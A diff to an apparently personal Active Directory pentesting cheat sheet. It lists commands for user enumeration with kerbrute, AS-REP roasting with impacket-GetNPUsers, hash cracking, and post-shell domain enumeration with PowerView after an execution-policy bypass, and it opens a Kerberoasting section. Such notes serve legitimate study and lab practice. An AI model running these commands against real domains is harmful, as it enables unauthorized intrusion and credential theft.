@@ -45,9 +45,14 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
 5. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
 6. Crack the hash
-## After initial shell, credentials or some password
-1. Enumerate the initial target using powerview. Trasfer file to target.
-2. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+# After initial shell, credentials or some password (Enumeration)
+1. Things we want to know, domain admins, 
+2. Enumerate the initial target using powerview. Trasfer file to target.
+3. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+4. Transfer Powerview via
+5. `powershell -ep bypass ` `. .\PowerView.ps1` 
+6. `Get-NetDomain` , (domain info) `net user` (for local accounts) `net user /domain` (for all domain users) `net user <USERNAME>
+7. `Get-NetDomainController` (for DC info, DC IP)
 ## Kerbreroasting (Service account)
 1. Once we have creds, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
 ```
